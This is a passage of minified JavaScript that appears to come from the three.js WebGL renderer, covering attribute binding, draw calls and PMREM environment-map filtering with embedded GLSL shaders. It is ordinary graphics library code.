z=r.newAttributes,V=r.enabledAttributes,Z=r.attributeDivisors;z[w]=1,V[w]===0&&(t.enableVertexAttribArray(w),V[w]=1),Z[w]!==P&&(t.vertexAttribDivisor(w,P),Z[w]=P)}function g(){const w=r.newAttributes,P=r.enabledAttributes;for(let z=0,V=P.length;z<V;z++)P[z]!==w[z]&&(t.disableVertexAttribArray(z),P[z]=0)}function x(w,P,z,V,Z,$,X){X===!0?t.vertexAttribIPointer(w,P,z,Z,$):t.vertexAttribPointer(w,P,z,V,Z,$)}function S(w,P,z,V){y();const Z=V.attributes,$=z.getAttributes(),X=P.defaultAttributeValues;for(const H in $){const I=$[H];if(I.location>=0){let J=Z[H];if(J===void 0&&(H==="instanceMatrix"&&w.instanceMatrix&&(J=w.instanceMatrix),H==="instanceColor"&&w.instanceColor&&(J=w.instanceColor)),J!==void 0){const K=J.normalized,ne=J.itemSize,we=e.get(J);if(we===void 0)continue;const Pe=we.buffer,Ge=we.type,Ke=we.bytesPerElement,q=Ge===t.INT||Ge===t.UNSIGNED_INT||J.gpuType===ah;if(J.isInterleavedBufferAttribute){const O=J.data,ge=O.stride,Ue=J.offset;if(O.isInstancedInterleavedBuffer){for(let ye=0;ye<I.locationSize;ye++)u(I.location+ye,O.meshPerAttribute);w.isInstancedMesh!==!0&&V._maxInstanceCount===void 0&&(V._maxInstanceCount=O.meshPerAttribute*O.count)}else for(let ye=0;ye<I.locationSize;ye++)m(I.location+ye);t.bindBuffer(t.ARRAY_BUFFER,Pe);for(let ye=0;ye<I.locationSize;ye++)x(I.location+ye,ne/I.locationSize,Ge,K,ge*Ke,(Ue+ne/I.locationSize*ye)*Ke,q)}else{if(J.isInstancedBufferAttribute){for(let O=0;O<I.locationSize;O++)u(I.location+O,J.meshPerAttribute);w.isInstancedMesh!==!0&&V._maxInstanceCount===void 0&&(V._maxInstanceCount=J.meshPerAttribute*J.count)}else for(let O=0;O<I.locationSize;O++)m(I.location+O);t.bindBuffer(t.ARRAY_BUFFER,Pe);for(let O=0;O<I.locationSize;O++)x(I.location+O,ne/I.locationSize,Ge,K,ne*Ke,ne/I.locationSize*O*Ke,q)}}else if(X!==void 0){const K=X[H];if(K!==void 0)switch(K.length){case 2:t.vertexAttrib2fv(I.location,K);break;case 3:t.vertexAttrib3fv(I.location,K);break;case 4:t.vertexAttrib4fv(I.location,K);break;default:t.vertexAttrib1fv(I.location,K)}}}}g()}function T(){N();for(const w in i){const P=i[w];for(const z in P){const V=P[z];for(const Z in V)d(V[Z].object),delete V[Z];delete P[z]}delete i[w]}}function A(w){if(i[w.id]===void 0)return;const P=i[w.id];for(const z in P){const V=P[z];for(const Z in V)d(V[Z].object),delete V[Z];delete P[z]}delete i[w.id]}function R(w){for(const P in i){const z=i[P];if(z[w.id]===void 0)continue;const V=z[w.id];for(const Z in V)d(V[Z].object),delete V[Z];delete z[w.id]}}function N(){b(),a=!0,r!==s&&(r=s,c(r.object))}function b(){s.geometry=null,s.program=null,s.wireframe=!1}return{setup:o,reset:N,resetDefaultState:b,dispose:T,releaseStatesOfGeometry:A,releaseStatesOfProgram:R,initAttributes:y,enableAttribute:m,disableUnusedAttributes:g}}function H1(t,e,n){let i;function s(c){i=c}function r(c,d){t.drawArrays(i,c,d),n.update(d,i,1)}function a(c,d,p){p!==0&&(t.drawArraysInstanced(i,c,d,p),n.update(d,i,p))}function o(c,d,p){if(p===0)return;e.get("WEBGL_multi_draw").multiDrawArraysWEBGL(i,c,0,d,0,p);let f=0;for(let _=0;_<p;_++)f+=d[_];n.update(f,i,1)}function l(c,d,p,h){if(p===0)return;const f=e.get("WEBGL_multi_draw");if(f===null)for(let _=0;_<c.length;_++)a(c[_],d[_],h[_]);else{f.multiDrawArraysInstancedWEBGL(i,c,0,d,0,h,0,p);let _=0;for(let y=0;y<p;y++)_+=d[y]*h[y];n.update(_,i,1)}}this.setMode=s,this.render=r,this.renderInstances=a,this.renderMultiDraw=o,this.renderMultiDrawInstances=l}function G1(t,e,n,i){let s;function r(){if(s!==void 0)return s;if(e.has("EXT_texture_filter_anisotropic")===!0){const R=e.get("EXT_texture_filter_anisotropic");s=t.getParameter(R.MAX_TEXTURE_MAX_ANISOTROPY_EXT)}else s=0;return s}function a(R){return!(R!==jn&&i.convert(R)!==t.getParameter(t.IMPLEMENTATION_COLOR_READ_FORMAT))}function o(R){const N=R===Li&&(e.has("EXT_color_buffer_half_float")||e.has("EXT_color_buffer_float"));return!(R!==Sn&&i.convert(R)!==t.getParameter(t.IMPLEMENTATION_COLOR_READ_TYPE)&&R!==ti&&!N)}function l(R){if(R==="highp"){if(t.getShaderPrecisionFormat(t.VERTEX_SHADER,t.HIGH_FLOAT).precision>0&&t.getShaderPrecisionFormat(t.FRAGMENT_SHADER,t.HIGH_FLOAT).precision>0)return"highp";R="mediump"}return R==="mediump"&&t.getShaderPrecisionFormat(t.VERTEX_SHADER,t.MEDIUM_FLOAT).precision>0&&t.getShaderPrecisionFormat(t.FRAGMENT_SHADER,t.MEDIUM_FLOAT).precision>0?"mediump":"lowp"}let c=n.precision!==void 0?n.precision:"highp";const d=l(c);d!==c&&(Ne("WebGLRenderer:",c,"not supported, using",d,"instead."),c=d);const p=n.logarithmicDepthBuffer===!0,h=n.reversedDepthBuffer===!0&&e.has("EXT_clip_control"),f=t.getParameter(t.MAX_TEXTURE_IMAGE_UNITS),_=t.getParameter(t.MAX_VERTEX_TEXTURE_IMAGE_UNITS),y=t.getParameter(t.MAX_TEXTURE_SIZE),m=t.getParameter(t.MAX_CUBE_MAP_TEXTURE_SIZE),u=t.getParameter(t.MAX_VERTEX_ATTRIBS),g=t.getParameter(t.MAX_VERTEX_UNIFORM_VECTORS),x=t.getParameter(t.MAX_VARYING_VECTORS),S=t.getParameter(t.MAX_FRAGMENT_UNIFORM_VECTORS),T=t.getParameter(t.MAX_SAMPLES),A=t.getParameter(t.SAMPLES);return{isWebGL2:!0,getMaxAnisotropy:r,getMaxPrecision:l,textureFormatReadable:a,textureTypeReadable:o,precision:c,logarithmicDepthBuffer:p,reversedDepthBuffer:h,maxTextures:f,maxVertexTextures:_,maxTextureSize:y,maxCubemapSize:m,maxAttributes:u,maxVertexUniforms:g,maxVaryings:x,maxFragmentUniforms:S,maxSamples:T,samples:A}}function W1(t){const e=this;let n=null,i=0,s=!1,r=!1;const a=new Ms,o=new Fe,l={value:null,needsUpdate:!1};this.uniform=l,this.numPlanes=0,this.numIntersection=0,this.init=function(p,h){const f=p.length!==0||h||i!==0||s;return s=h,i=p.length,f},this.beginShadows=function(){r=!0,d(null)},this.endShadows=function(){r=!1},this.setGlobalState=function(p,h){n=d(p,h,0)},this.setState=function(p,h,f){const _=p.clippingPlanes,y=p.clipIntersection,m=p.clipShadows,u=t.get(p);if(!s||_===null||_.length===0||r&&!m)r?d(null):c();else{const g=r?0:i,x=g*4;let S=u.clippingState||null;l.value=S,S=d(_,h,x,f);for(let T=0;T!==x;++T)S[T]=n[T];u.clippingState=S,this.numIntersection=y?this.numPlanes:0,this.numPlanes+=g}};function c(){l.value!==n&&(l.value=n,l.needsUpdate=i>0),e.numPlanes=i,e.numIntersection=0}function d(p,h,f,_){const y=p!==null?p.length:0;let m=null;if(y!==0){if(m=l.value,_!==!0||m===null){const u=f+y*4,g=h.matrixWorldInverse;o.getNormalMatrix(g),(m===null||m.length<u)&&(m=new Float32Array(u));for(let x=0,S=f;x!==y;++x,S+=4)a.copy(p[x]).applyMatrix4(g,o),a.normal.toArray(m,S),m[S+3]=a.constant}l.value=m,l.needsUpdate=!0}return e.numPlanes=y,e.numIntersection=0,m}}function j1(t){let e=new WeakMap;function n(a,o){return o===Md?a.mapping=zs:o===Ed&&(a.mapping=Ir),a}function i(a){if(a&&a.isTexture){const o=a.mapping;if(o===Md||o===Ed)if(e.has(a)){const l=e.get(a).texture;return n(l,a.mapping)}else{const l=a.image;if(l&&l.height>0){const c=new n_(l.height);return c.fromEquirectangularTexture(t,a),e.set(a,c),a.addEventListener("dispose",s),n(c.texture,a.mapping)}else return null}}return a}function s(a){const o=a.target;o.removeEventListener("dispose",s);const l=e.get(o);l!==void 0&&(e.delete(o),l.dispose())}function r(){e=new WeakMap}return{get:i,dispose:r}}const Zi=4,Am=[.125,.215,.35,.446,.526,.582],Ts=20,X1=256,oa=new xh,Cm=new Ie;let hu=null,fu=0,mu=0,gu=!1;const q1=new B;class Rm{constructor(e){this._renderer=e,this._pingPongRenderTarget=null,this._lodMax=0,this._cubeSize=0,this._sizeLods=[],this._sigmas=[],this._lodMeshes=[],this._backgroundBox=null,this._cubemapMaterial=null,this._equirectMaterial=null,this._blurMaterial=null,this._ggxMaterial=null}fromScene(e,n=0,i=.1,s=100,r={}){const{size:a=256,position:o=q1}=r;hu=this._renderer.getRenderTarget(),fu=this._renderer.getActiveCubeFace(),mu=this._renderer.getActiveMipmapLevel(),gu=this._renderer.xr.enabled,this._renderer.xr.enabled=!1,this._setSize(a);const l=this._allocateTargets();return l.depthBuffer=!0,this._sceneToCubeUV(e,i,s,l,o),n>0&&this._blur(l,0,0,n),this._applyPMREM(l),this._cleanup(l),l}fromEquirectangular(e,n=null){return this._fromTexture(e,n)}fromCubemap(e,n=null){return this._fromTexture(e,n)}compileCubemapShader(){this._cubemapMaterial===null&&(this._cubemapMaterial=km(),this._compileMaterial(this._cubemapMaterial))}compileEquirectangularShader(){this._equirectMaterial===null&&(this._equirectMaterial=Lm(),this._compileMaterial(this._equirectMaterial))}dispose(){this._dispose(),this._cubemapMaterial!==null&&this._cubemapMaterial.dispose(),this._equirectMaterial!==null&&this._equirectMaterial.dispose(),this._backgroundBox!==null&&(this._backgroundBox.geometry.dispose(),this._backgroundBox.material.dispose())}_setSize(e){this._lodMax=Math.floor(Math.log2(e)),this._cubeSize=Math.pow(2,this._lodMax)}_dispose(){this._blurMaterial!==null&&this._blurMaterial.dispose(),this._ggxMaterial!==null&&this._ggxMaterial.dispose(),this._pingPongRenderTarget!==null&&this._pingPongRenderTarget.dispose();for(let e=0;e<this._lodMeshes.length;e++)this._lodMeshes[e].geometry.dispose()}_cleanup(e){this._renderer.setRenderTarget(hu,fu,mu),this._renderer.xr.enabled=gu,e.scissorTest=!1,rr(e,0,0,e.width,e.height)}_fromTexture(e,n){e.mapping===zs||e.mapping===Ir?this._setSize(e.image.length===0?16:e.image[0].width||e.image[0].image.width):this._setSize(e.image.width/4),hu=this._renderer.getRenderTarget(),fu=this._renderer.getActiveCubeFace(),mu=this._renderer.getActiveMipmapLevel(),gu=this._renderer.xr.enabled,this._renderer.xr.enabled=!1;const i=n||this._allocateTargets();return this._textureToCubeUV(e,i),this._applyPMREM(i),this._cleanup(i),i}_allocateTargets(){const e=3*Math.max(this._cubeSize,112),n=4*this._cubeSize,i={magFilter:Kt,minFilter:Kt,generateMipmaps:!1,type:Li,format:jn,colorSpace:Or,depthBuffer:!1},s=Pm(e,n,i);if(this._pingPongRenderTarget===null||this._pingPongRenderTarget.width!==e||this._pingPongRenderTarget.height!==n){this._pingPongRenderTarget!==null&&this._dispose(),this._pingPongRenderTarget=Pm(e,n,i);const{_lodMax:r}=this;({lodMeshes:this._lodMeshes,sizeLods:this._sizeLods,sigmas:this._sigmas}=Y1(r)),this._blurMaterial=K1(r,e,n),this._ggxMaterial=$1(r,e,n)}return s}_compileMaterial(e){const n=new Ot(new An,e);this._renderer.compile(n,oa)}_sceneToCubeUV(e,n,i,s,r){const l=new un(90,1,n,i),c=[1,-1,1,1,1,1],d=[1,1,1,-1,-1,-1],p=this._renderer,h=p.autoClear,f=p.toneMapping;p.getClearColor(Cm),p.toneMapping=ri,p.autoClear=!1,p.state.buffers.depth.getReversed()&&(p.setRenderTarget(s),p.clearDepth(),p.setRenderTarget(null)),this._backgroundBox===null&&(this._backgroundBox=new Ot(new wi,new mh({name:"PMREM.Background",side:mn,depthWrite:!1,depthTest:!1})));const y=this._backgroundBox,m=y.material;let u=!1;const g=e.background;g?g.isColor&&(m.color.copy(g),e.background=null,u=!0):(m.color.copy(Cm),u=!0);for(let x=0;x<6;x++){const S=x%3;S===0?(l.up.set(0,c[x],0),l.position.set(r.x,r.y,r.z),l.lookAt(r.x+d[x],r.y,r.z)):S===1?(l.up.set(0,0,c[x]),l.position.set(r.x,r.y,r.z),l.lookAt(r.x,r.y+d[x],r.z)):(l.up.set(0,c[x],0),l.position.set(r.x,r.y,r.z),l.lookAt(r.x,r.y,r.z+d[x]));const T=this._cubeSize;rr(s,S*T,x>2?T:0,T,T),p.setRenderTarget(s),u&&p.render(y,l),p.render(e,l)}p.toneMapping=f,p.autoClear=h,e.background=g}_textureToCubeUV(e,n){const i=this._renderer,s=e.mapping===zs||e.mapping===Ir;s?(this._cubemapMaterial===null&&(this._cubemapMaterial=km()),this._cubemapMaterial.uniforms.flipEnvMap.value=e.isRenderTargetTexture===!1?-1:1):this._equirectMaterial===null&&(this._equirectMaterial=Lm());const r=s?this._cubemapMaterial:this._equirectMaterial,a=this._lodMeshes[0];a.material=r;const o=r.uniforms;o.envMap.value=e;const l=this._cubeSize;rr(n,0,0,3*l,2*l),i.setRenderTarget(n),i.render(a,oa)}_applyPMREM(e){const n=this._renderer,i=n.autoClear;n.autoClear=!1;const s=this._lodMeshes.length;for(let r=1;r<s;r++)this._applyGGXFilter(e,r-1,r);n.autoClear=i}_applyGGXFilter(e,n,i){const s=this._renderer,r=this._pingPongRenderTarget,a=this._ggxMaterial,o=this._lodMeshes[i];o.material=a;const l=a.uniforms,c=i/(this._lodMeshes.length-1),d=n/(this._lodMeshes.length-1),p=Math.sqrt(c*c-d*d),h=0+c*1.25,f=p*h,{_lodMax:_}=this,y=this._sizeLods[i],m=3*y*(i>_-Zi?i-_+Zi:0),u=4*(this._cubeSize-y);l.envMap.value=e.texture,l.roughness.value=f,l.mipInt.value=_-n,rr(r,m,u,3*y,2*y),s.setRenderTarget(r),s.render(o,oa),l.envMap.value=r.texture,l.roughness.value=0,l.mipInt.value=_-i,rr(e,m,u,3*y,2*y),s.setRenderTarget(e),s.render(o,oa)}_blur(e,n,i,s,r){const a=this._pingPongRenderTarget;this._halfBlur(e,a,n,i,s,"latitudinal",r),this._halfBlur(a,e,i,i,s,"longitudinal",r)}_halfBlur(e,n,i,s,r,a,o){const l=this._renderer,c=this._blurMaterial;a!=="latitudinal"&&a!=="longitudinal"&&Qe("blur direction must be either latitudinal or longitudinal!");const d=3,p=this._lodMeshes[s];p.material=c;const h=c.uniforms,f=this._sizeLods[i]-1,_=isFinite(r)?Math.PI/(2*f):2*Math.PI/(2*Ts-1),y=r/_,m=isFinite(r)?1+Math.floor(d*y):Ts;m>Ts&&Ne(`sigmaRadians, ${r}, is too large and will clip, as it requested ${m} samples when the maximum is set to ${Ts}`);const u=[];let g=0;for(let R=0;R<Ts;++R){const N=R/y,b=Math.exp(-N*N/2);u.push(b),R===0?g+=b:R<m&&(g+=2*b)}for(let R=0;R<u.length;R++)u[R]=u[R]/g;h.envMap.value=e.texture,h.samples.value=m,h.weights.value=u,h.latitudinal.value=a==="latitudinal",o&&(h.poleAxis.value=o);const{_lodMax:x}=this;h.dTheta.value=_,h.mipInt.value=x-i;const S=this._sizeLods[s],T=3*S*(s>x-Zi?s-x+Zi:0),A=4*(this._cubeSize-S);rr(n,T,A,3*S,2*S),l.setRenderTarget(n),l.render(p,oa)}}function Y1(t){const e=[],n=[],i=[];let s=t;const r=t-Zi+1+Am.length;for(let a=0;a<r;a++){const o=Math.pow(2,s);e.push(o);let l=1/o;a>t-Zi?l=Am[a-t+Zi-1]:a===0&&(l=0),n.push(l);const c=1/(o-2),d=-c,p=1+c,h=[d,d,p,d,p,p,d,d,p,p,d,p],f=6,_=6,y=3,m=2,u=1,g=new Float32Array(y*_*f),x=new Float32Array(m*_*f),S=new Float32Array(u*_*f);for(let A=0;A<f;A++){const R=A%3*2/3-1,N=A>2?0:-1,b=[R,N,0,R+2/3,N,0,R+2/3,N+1,0,R,N,0,R+2/3,N+1,0,R,N+1,0];g.set(b,y*_*A),x.set(h,m*_*A);const w=[A,A,A,A,A,A];S.set(w,u*_*A)}const T=new An;T.setAttribute("position",new oi(g,y)),T.setAttribute("uv",new oi(x,m)),T.setAttribute("faceIndex",new oi(S,u)),i.push(new Ot(T,null)),s>Zi&&s--}return{lodMeshes:i,sizeLods:e,sigmas:n}}function Pm(t,e,n){const i=new ai(t,e,n);return i.texture.mapping=ac,i.texture.name="PMREM.cubeUv",i.scissorTest=!0,i}function rr(t,e,n,i,s){t.viewport.set(e,n,i,s),t.scissor.set(e,n,i,s)}function $1(t,e,n){return new ui({name:"PMREMGGXConvolution",defines:{GGX_SAMPLES:X1,CUBEUV_TEXEL_WIDTH:1/e,CUBEUV_TEXEL_HEIGHT:1/n,CUBEUV_MAX_MIP:`${t}.0`},uniforms:{envMap:{value:null},roughness:{value:0},mipInt:{value:0}},vertexShader:lc(),fragmentShader:`

			precision highp float;
			precision highp int;

			varying vec3 vOutputDirection;

			uniform sampler2D envMap;
			uniform float roughness;
			uniform float mipInt;

			#define ENVMAP_TYPE_CUBE_UV
			#include <cube_uv_reflection_fragment>

			#define PI 3.14159265359

			// Van der Corput radical inverse
			float radicalInverse_VdC(uint bits) {
				bits = (bits << 16u) | (bits >> 16u);
				bits = ((bits & 0x55555555u) << 1u) | ((bits & 0xAAAAAAAAu) >> 1u);
				bits = ((bits & 0x33333333u) << 2u) | ((bits & 0xCCCCCCCCu) >> 2u);
				bits = ((bits & 0x0F0F0F0Fu) << 4u) | ((bits & 0xF0F0F0F0u) >> 4u);
				bits = ((bits & 0x00FF00FFu) << 8u) | ((bits & 0xFF00FF00u) >> 8u);
				return float(bits) * 2.3283064365386963e-10; // / 0x100000000
			}

			// Hammersley sequence
			vec2 hammersley(uint i, uint N) {
				return vec2(float(i) / float(N), radicalInverse_VdC(i));
			}

			// GGX VNDF importance sampling (Eric Heitz 2018)
			// "Sampling the GGX Distribution of Visible Normals"
			// https://jcgt.org/published/0007/04/01/
			vec3 importanceSampleGGX_VNDF(vec2 Xi, vec3 V, float roughness) {
				float alpha = roughness * roughness;

				// Section 3.2: Transform view direction to hemisphere configuration
				vec3 Vh = normalize(vec3(alpha * V.x, alpha * V.y, V.z));

				// Section 4.1: Orthonormal basis
				float lensq = Vh.x * Vh.x + Vh.y * Vh.y;
				vec3 T1 = lensq > 0.0 ? vec3(-Vh.y, Vh.x, 0.0) / sqrt(lensq) : vec3(1.0, 0.0, 0.0);
				vec3 T2 = cross(Vh, T1);

				// Section 4.2: Parameterization of projected area
				float r = sqrt(Xi.x);
				float phi = 2.0 * PI * Xi.y;
				float t1 = r * cos(phi);
				float t2 = r * sin(phi);
				float s = 0.5 * (1.0 + Vh.z);
				t2 = (1.0 - s) * sqrt(1.0 - t1 * t1) + s * t2;

				// Section 4.3: Reprojection onto hemisphere
				vec3 Nh = t1 * T1 + t2 * T2 + sqrt(max(0.0, 1.0 - t1 * t1 - t2 * t2)) * Vh;

				// Section 3.4: Transform back to ellipsoid configuration
				return normalize(vec3(alpha * Nh.x, alpha * Nh.y, max(0.0, Nh.z)));
			}

			void main() {
				vec3 N = normalize(vOutputDirection);
				vec3 V = N; // Assume view direction equals normal for pre-filtering

				vec3 prefilteredColor = vec3(0.0);
				float totalWeight = 0.0;

				// For very low roughness, just sample the environment directly
				if (roughness < 0.001) {
					gl_FragColor = vec4(bilinearCubeUV(envMap, N, mipInt), 1.0);
					return;
				}

				// Tangent space basis for VNDF sampling
				vec3 up = abs(N.z) < 0.999 ? vec3(0.0, 0.0, 1.0) : vec3(1.0, 0.0, 0.0);
				vec3 tangent = normalize(cross(up, N));
				vec3 bitangent = cross(N, tangent);

				for(uint i = 0u; i < uint(GGX_SAMPLES); i++) {
					vec2 Xi = hammersley(i, uint(GGX_SAMPLES));

					// For PMREM, V = N, so in tangent space V is always (0, 0, 1)
					vec3 H_tangent = importanceSampleGGX_VNDF(Xi, vec3(0.0, 0.0, 1.0), roughness);

					// Transform H back to world space
					vec3 H = normalize(tangent * H_tangent.x + bitangent * H_tangent.y + N * H_tangent.z);
					vec3 L = normalize(2.0 * dot(V, H) * H - V);

					float NdotL = max(dot(N, L), 0.0);

					if(NdotL > 0.0) {
						// Sample environment at fixed mip level
						// VNDF importance sampling handles the distribution filtering
						vec3 sampleColor = bilinearCubeUV(envMap, L, mipInt);

						// Weight by NdotL for the split-sum approximation
						// VNDF PDF naturally accounts for the visible microfacet distribution
						prefilteredColor += sampleColor * NdotL;
						totalWeight += NdotL;
					}
				}

				if (totalWeight > 0.0) {
					prefilteredColor = prefilteredColor / totalWeight;
				}

				gl_FragColor = vec4(prefilteredColor, 1.0);
			}
		`,blending:Ei,depthTest:!1,depthWrite:!1})}function K1(t,e,n){const i=new Float32Array(Ts),s=new B(0,1,0);return new ui({name:"SphericalGaussianBlur",defines:{n:Ts,CUBEUV_TEXEL_WIDTH:1/e,CUBEUV_TEXEL_HEIGHT:1/n,CUBEUV_MAX_MIP:`${t}.0`},uniforms:{envMap:{value:null},samples:{value:1},weights:{value:i},latitudinal:{value:!1},dTheta:{value:0},mipInt:{value:0},poleAxis:{value:s}},vertexShader:lc(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			varying vec3 vOutputDirection;

			uniform sampler2D envMap;
			uniform int samples;
			uniform float weights[ n ];
			uniform bool latitudinal;
			uniform float dTheta;
			uniform float mipInt;
			uniform vec3 poleAxis;

			#define ENVMAP_TYPE_CUBE_UV
			#include <cube_uv_reflection_fragment>

			vec3 getSample( float theta, vec3 axis ) {

				float cosTheta = cos( theta );
				// Rodrigues' axis-angle rotation
				vec3 sampleDirection = vOutputDirection * cosTheta
					+ cross( axis, vOutputDirection ) * sin( theta )
					+ axis * dot( axis, vOutputDirection ) * ( 1.0 - cosTheta );

				return bilinearCubeUV( envMap, sampleDirection, mipInt );

			}

			void main() {

				vec3 axis = latitudinal ? poleAxis : cross( poleAxis, vOutputDirection );

				if ( all( equal( axis, vec3( 0.0 ) ) ) ) {

					axis = vec3( vOutputDirection.z, 0.0, - vOutputDirection.x );

				}

				axis = normalize( axis );

				gl_FragColor = vec4( 0.0, 0.0, 0.0, 1.0 );
				gl_FragColor.rgb += weights[ 0 ] * getSample( 0.0, axis );

				for ( int i = 1; i < n; i++ ) {

					if ( i >= samples ) {

						break;

					}

					float theta = dTheta * float( i );
					gl_FragColor.rgb += weights[ i ] * getSample( -1.0 * theta, axis );
					gl_FragColor.rgb += weights[ i ] * getSample( theta, axis );

				}

			}
		`,blending:Ei,depthTest:!1,depthWrite:!1})}function Lm(){return new ui({name:"EquirectangularToCubeUV",uniforms:{envMap:{value:null}},vertexShader:lc(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			varying vec3 vOutputDirection;

			uniform sampler2D envMap;

			#include <common>

			void main() {

				vec3 outputDirection = normalize( vOutputDirection );
				vec2 uv = equirectUv( outputDirection );

				gl_FragColor = vec4( texture2D ( envMap, uv ).rgb, 1.0 );

			}
		`,blending:Ei,depthTest:!1,depthWrite:!1})}function km(){return new ui({name:"CubemapToCubeUV",uniforms:{envMap:{value:null},flipEnvMap:{value:-1}},vertexShader:lc(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			uniform float flipEnvMap;

			varying vec3 vOutputDirection;

			uniform samplerCube envMap;

			void main() {

				gl_FragColor = textureCube( envMap, vec3( flipEnvMap * vOutputDirection.x, vOutputDirection.yz ) );

			}
		`,blending:Ei,depthTest:!1,depthWrite:!1})}function lc(){return`

		precision mediump float;
		precision mediump int;

		attribute float faceIndex;

		varying vec3 vOutputDirection;

		// RH coordinate system; PMREM face-indexing convention
		vec3 getDirection( vec2 uv, float face ) {

			uv = 2.0 * uv - 1.0;

			vec3 direction = vec3( uv, 1.0 );

			if ( face == 0.0 ) {

				direction = direction.zyx; // ( 1, v, u ) pos x

			} else if ( face == 1.0 ) {

				direction = direction.xzy;
				direction.xz *= -1.0; // ( -u, 1, -v ) pos y

			} else if ( face == 2.0 ) {

				direction.x *= -1.0; // ( -u, v, 1 ) pos z

			} else if ( face == 3.0 ) {

				direction = direction.zyx;
				direction.xz *= -1.0; // ( -1, v, -u ) neg x

			} else if ( face == 4.0 ) {

				direction = direction.xzy;
				direction.xy *= -1.0; // ( -u, -1, v ) neg y

			} else if ( face == 5.0 ) {

				direction.z *= -1.0; // ( u, v, -1 ) neg z

			}

			return direction;

		}

		void main() {

			vOutputDirection = getDirection( uv, faceIndex );
			gl_Position = vec4( position, 1.0 );

		}
	`}function Z1(t){let e=new WeakMap,n=null;function i(o){if(o&&o.isTexture){const l=o.mapping,c=l===Md||l===Ed,d=l===zs||l===Ir;if(c||d){let p=e.get(o);const h=p!==void 0?p.texture.pmremVersion:0;if(o.isRenderTargetTexture&&o.pmremVersion!==h)return n===null&&(n=new Rm(t)),p=c?n.fromEquirectangular(o,p):n.fromCubemap(o,p),p.texture.pmremVersion=o.pmremVersion,e.set(o,p),p.texture;if(p!==void 0)return p.texture;{const f=o.image;return c&&f&&f.height>0||d&&f&&s(f)?(n===null&&(n=new Rm(t)),p=c?n.fromEquirectangular(o):n.fromCubemap(o),p.texture.pmremVersion=o.pmremVersion,e.set(o,p),o.addEventListener("dispose",r),p.texture):null}}}return o}function s(o){let l=0;const c=6;for(let d=0;d<c;d++)o[d]!==void 0&&l++;return l===c}function r(o){const l=o.target;l.removeEventListener("dispose",r);const c=e.get(l);c!==void 0&&(e.delete(l),c.dispose())}function a(){e=new WeakMap,n!==null&&(n.dispose(),n=null)}return{get:i,dispose:a}}function J1(t){const e={};function n(i){if(e[i]!==void 0)return e[i];const s=t.getExtension(i);return e[i]=s,s}return{has:function(i){return n(i)!==null},init:function(){n("EXT_color_buffer_float"),n("WEBGL_clip_cull_distance"),n("OES_texture_float_linear"),n("EXT_color_buffer_half_float"),n("WEBGL_multisampled_render_to_texture"),n("WEBGL_render_shared_exponent")},get:function(i){const s=n(i);return s===null&&qa("WebGLRenderer: "+i+" extension not supported."),s}}}function Q1(t,e,n,i){const s={},r=new WeakMap;function a(p){const h=p.target;h.index!==null&&e.remove(h.index);for(const _ in h.attributes)e.remove(h.attributes[_]);h.removeEventListener("dispose",a),delete s[h.id];const f=r.get(h);f&&(e.remove(f),r.delete(h)),i.releaseStatesOfGeometry(h),h.isInstancedBufferGeometry===!0&&delete h._maxInstanceCount,n.memory.geometries--}function o(p,h){return s[h.id]===!0||(h.addEventListener("dispose",a),s[h.id]=!0,n.memory.geometries++),h}function l(p){const h=p.attributes;for(const f in h)e.update(h[f],t.ARRAY_BUFFER)}function c(p){const h=[],f=p.index,_=p.attributes.position;let y=0;if(f!==null){const g=f.array;y=f.version;for(let x=0,S=g.length;x<S;x+=3){const T=g[x+0],A=g[x+1],R=g[x+2];h.push(T,A,A,R,R,T)}}else if(_!==void 0){const g=_.array;y=_.version;for(let x=0,S=g.length/3-1;x<S;x+=3){const T=x+0,A=x+1,R=x+2;h.push(T,A,A,R,R,T)}}else return;const m=new(X0(h)?J0:Z0)(h,1);m.version=y;const u=r.get(p);u&&e.remove(u),r.set(p,m)}function d(p){const h=r.get(p);if(h){const f=p.index;f!==null&&h.version<f.version&&c(p)}else c(p);return r.get(p)}return{get:o,update:l,getWireframeAttribute:d}}function eT(t,e,n){let i;function s(h){i=h}let r,a;function o(h){r=h.type,a=h.bytesPerElement}function l(h,f){t.drawElements(i,f,r,h*a),n.update(f,i,1)}function c(h,f,_){_!==0&&(t.drawElementsInstanced(i,f,r,h*a,_),n.update(f,i,_))}function d(h,f,_){if(_===0)return;e.get("WEBGL_multi_draw").multiDrawElementsWEBGL(i,f,0,r,h,0,_);let m=0;for(let u=0;u<_;u++)m+=f[u];n.update(m,i,1)}function p(h,f,_,y){if(_===0)return;const m=e.get("WEBGL_multi_draw");if(m===null)for(let u=0;u<h.length;u++)c(h[u]/a,f[u],y[u]);else{m.multiDrawElementsInstancedWEBGL(i,f,0,r,h,0,y,0,_);let u=0;for(let g=0;g<_;g++)u+=f[g]*y[g];n.update(u,i,1)}}this.setMode=s,this.setIndex=o,this.render=l,this.renderInstances=c,this.renderMultiDraw=d,this.renderMultiDrawInstances=p}function tT(t){const e={geometries:0,textures:0},n={frame:0,calls:0,triangles:0,points:0,lines:0};function i(r,a,o){switch(n.calls++,a){case t.TRIANGLES:n.triangles+=o*(r/3);break;case t.LINES:n.lines+=o*(r/2);break;case t.LINE_STRIP:n.lines+=o*(r-1);break;case t.LINE_LOOP:n.lines+=o*r;break;case t.POINTS:n.points+=o*r;break;default:Qe("WebGLInfo: Unknown draw mode:",a);break}}function s(){n.calls=0,n.triangles=0,n.points=0,n.lines=0}return{memory:e,render:n,programs:null,autoReset:!0,reset:s,update:i}}function nT(t,e,n){const i=new WeakMap,s=new Mt;function r(a,o,l){const c=a.morphTargetInfluences,d=o.morphAttributes.position||o.morphAttributes.normal||o.morphAttributes.color,p=d!==void 0?d.length:0;let h=i.get(o);if(h===void 0||h.count!==p){let w=function(){N.dispose(),i.delete(o),o.removeEventListener("dispose",w)};var f=w;h!==void 0&&h.texture.dispose();const _=o.morphAttributes.position!==void 0,y=o.morphAttributes.normal!==void 0,m=o.morphAttributes.color!==void 0,u=o.morphAttributes.position||[],g=o.morphAttributes.normal||[],x=o.morphAttributes.color||[];let S=0;_===!0&&(S=1),y===!0&&(S=2),m===!0&&(S=3);let T=o.attributes.position.count*S,A=1;T>e.maxTextureSize&&(A=Math.ceil(T/e.maxTextureSize),T=e.maxTextureSize);const R=new Float32Array(T*A*4*p),N=new q0(R,T,A,p);N.type=ti,N.needsUpdate=!0;const b=S*4;for(let P=0;P<p;P++){const z=u[P],V=g[P],Z=x[P],$=T*A*4*P;for(let X=0;X<z.count;X++){const 